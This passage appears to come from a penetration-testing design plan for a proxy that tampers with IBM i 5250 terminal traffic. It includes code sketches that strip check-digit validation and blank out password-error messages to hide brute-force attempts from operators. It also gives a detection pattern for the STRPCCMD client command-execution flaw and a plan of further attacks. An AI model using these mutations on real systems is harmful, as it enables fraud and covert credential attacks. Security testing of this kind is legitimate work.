    for i, f in enumerate(screen.fields):
        if not f.protected:
            continue
        text = codec.to_ascii(f.content)
        score = 0
        reasons = []
        if any(c.isdigit() for c in text):
            score += 3; reasons.append("contains digits")
        if 1 <= f.length <= 4:
            score += 3; reasons.append("short (flag/code length)")
        if f.hidden:
            score += 4; reasons.append("HIDDEN")
        if f.length in input_lengths:
            score += 2; reasons.append(f"length matches an input field ({f.length})")
        if not text.strip():
            score -= 2; reasons.append("blank")
        if f.length > 50:
            score -= 2; reasons.append("long (decorative)")

        ranked.append({
            "field_idx": i, "row": f.row, "col": f.col, "length": f.length,
            "score": score, "reasons": reasons,
            "current_value": text[:40],
        })

    ranked.sort(key=lambda x: -x["score"])
    return ranked
```

**LOC estimate:** 80

---

## 7. Tier E — Quick wins

### E1. Self-check FCW strip (`0xB1A0` mod-10, `0xB140` mod-11)

**Module:** `tn5250.py` — extend `_mutate_sf()`

**Mechanic:** FCW `0xB1A0` tells the *emulator* to validate a Luhn check digit before allowing Field Exit. Strip it → emulator stops validating → if host trusts the terminal, invalid account numbers persist.

```python
# tn5250.py — in _mutate_sf, in the FCW skip loop
FCW_SELFCHECK_MOD10 = 0xB1A0
FCW_SELFCHECK_MOD11 = 0xB140

# Currently:
while pos + 2 <= end:
    w = (out[pos] << 8) | out[pos + 1]
    if (w & FCW_ID_MASK) == FCW_ID:
        pos += 2
    else:
        break

# Becomes (when opts.remove_numeric — reuse the existing flag, or add a new one):
while pos + 2 <= end:
    w = (out[pos] << 8) | out[pos + 1]
    if (w & FCW_ID_MASK) == FCW_ID:
        if opts.remove_numeric and w in (FCW_SELFCHECK_MOD10, FCW_SELFCHECK_MOD11):
            # Strip: shift everything after left by 2 bytes.
            # But this changes packet length — same problem as 3270 high_visibility.
            # Safer: replace with a no-op FCW (if one exists) or leave but log.
            # Simplest: change to FCW_ID alone (0x8000) — minimal valid FCW.
            out[pos] = 0x80
            out[pos + 1] = 0x00
        pos += 2
    else:
        break
```

**Decision:** Don't delete (length change). Replace with `0x8000` (FCW marker, no payload). The emulator will skip an unknown FCW type harmlessly.

**LOC estimate:** 20

---

### E2. Write Error Code suppression

**Module:** `tn5250.py` — extend `mutate()`

**Mechanic:** `04 21 <text>` writes to the message line and sets X-II (input inhibited). Drop these packets host→client → operator never sees "Password not correct" during a brute. Combine with D1.

```python
# tn5250.py — new MutateOpts-style flag (or instance attr to avoid core change)
# In the ESC+CMD walk:
elif cmd == CMD_WRITE_ERROR_CODE:
    if self.suppress_errors:
        # Skip the entire error text — return before processing the rest
        # of this command's body. But we still need to walk past it.
        while pos < end and out[pos] not in (ESC, IAC):
            pos += 1
        # The OUTPUT should NOT contain this command. Easiest: zero
        # the ESC+CMD bytes so the emulator skips them as garbage.
        # But that might confuse the parser. Cleaner: build a new output
        # buffer skipping this command entirely.
        # ...this is more invasive than a simple in-place mutate.
```

**Decision:** This is the first mutation that needs to *delete* bytes (not rewrite). The current `mutate()` is in-place. Two options:
1. Replace ESC+CMD+text with EBCDIC spaces (`0x40`) — emulator renders blanks on the message line. Lazy but works.
2. Refactor `mutate()` to build a new output buffer.

Go with #1. The error line shows blanks instead of the message. The X-II inhibit might still set (it's in the CC bytes, not the text) but the operator doesn't see *what* errored.

**LOC estimate:** 20

---

### E3. STRPCCMD canary

**Module:** `attacks/detector.py` — add to `IBMiMessageDetector` or separate `STRPCCMDCanary`

**Mechanic:** CVE-2005-0868 — `STRPCO`+`STRPCCMD` sends a structured-field escape sequence (`0x21` PC Organizer) that makes IBM iAccess execute commands on the operator's PC. Pattern-match outbound, log + alert.

```python
# attacks/detector.py
# The PCO escape is a structured field with class byte 0x21.
# Per Wireshark dissector, after WSF (0xF3): len(2) class(1=0xD9) type(1)
# PCO type bytes need verification against a real capture, but the
# class-0xD9 + specific-type pattern is the marker.

PCO_PATTERN = re.compile(rb'\x04\xf3..\xd9\x21')  # ESC WSF len(2) class type=PCO

class STRPCCMDCanary:
    """Defensive: detect host→client RCE attempt via STRPCCMD.

    A compromised IBM i (or rogue admin) can use the proxy connection
    against the operator. This is the only host→client RCE in 5250.
    """

    def __init__(self):
        self.alerts: list[dict] = []

    def attach(self, daemon):
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str):
        if direction != "s2c":
            return
        if PCO_PATTERN.search(data):
            # Extract the command text after the PCO header
            self.alerts.append({
                "raw_hex": data.hex(),
                "warning": "STRPCCMD escape sequence detected — host attempting "
                           "client-side command execution (CVE-2005-0868)",
            })
```

**LOC estimate:** 30

---

## 8. Phasing

| Stream | Items | LOC | Tests | Ships when |
|---|---|---|---|---|
| **Quick** | E1, E2, E3, D3, D4 | ~270 | ~20 | First — no dependencies |
| **Pre-auth** | A1, A2, A3 | ~160 | ~15 | Parallel with Quick |
| **RPG core** | C1, C2 | ~230 | ~15 | After Quick (uses D3 for classification) |
| **RPG attacks** | B1, B2, B3, C3 | ~510 | ~25 | After RPG core (uses ExfmtDiffer) |
| **Brute** | D1, D2 | ~320 | ~10 | After Quick (uses D3 for hit detection) |

**Total: ~1,490 LOC, ~85 tests.**

---

## 9. Out of scope

- Save Screen blob substitution — high value but high effort (need to build a complete WTD serializer). Phase 4.
- Query Reply lie-up + WDSF popup hijack — same.
- Pointer-device FCW AID injection (`0x8Ann`) — need a real GUI emulator (ACS) to test against.
- Read MDT null-preservation confusion — subtle, may only work on specific RPG patterns. Defer until we have a target that uses `READ_MDT_ALT`.
- Roll-suppress subfile desync — visually obvious to operators. Low value vs effort.
- Continued-field chain truncation — need a target with multi-line fields.
- Kerberos→IBMRSEED downgrade — research suggests it falls back to interactive sign-on (good for us — IBMRSEED still works) but not to *automated* IBMRSEED. Need a Kerberos-enabled target to verify.

---

## 10. References

Sources from the research synthesis (2026-04-08):

**Protocol:**
- [RFC 4777 — IBM iSeries Telnet Enhancements](https://datatracker.ietf.org/doc/html/rfc4777) — §10.4 confrec codes
- [draft-garvey-networking-rfc4777bis-01](https://www.ietf.org/archive/id/draft-garvey-networking-rfc4777bis-01.html) — PBKDF2, IBMTICKET
- [tn5250 codes5250.h](https://github.com/hlandau/tn5250/blob/master/lib5250/codes5250.h) — FCW types
- [Wireshark packet-tn5250.c](https://github.com/wireshark/wireshark/blob/master/epan/dissectors/packet-tn5250.c) — full FCW table
- [IBM: Adding User Input Field to QDSIGNON](https://www.ibm.com/support/pages/adding-user-input-field-qdsignon) — UBUFFER, fixed buffer layout

**RPG/DDS:**
- [MC Press — CA/CF Indicators](https://www.mcpressonline.com/programming-other/cl/techtip-command-key-indicators)
- [NetPhantom 5250 Field/FFW spec](https://www.netphantom.com/APIDocumentation/se/entra/phantom/server/tn5250e/Field.html)
- [IBM — RTNCSRLOC](https://www.ibm.com/docs/en/i/7.3.0?topic=80-rtncsrloc-return-cursor-location-keyword-display-files)
- [IBM — PUTOVR](https://www.ibm.com/support/pages/additional-information-about-combination-dds-display-keywords-putovr-ovratr-and-ovrdta)
- [Silent Signal — CVE-2023-30988](https://blog.silentsignal.eu/2023/08/22/2023-08-22-Facsimile-Support-CVE-2023-30988/)
- [CVE-2005-0868 — STRPCCMD](https://www.cvedetails.com/cve/CVE-2005-0868/)

**Live test:** `ibmi_pentest.db` (Mels Cargo session, 511+ packets)
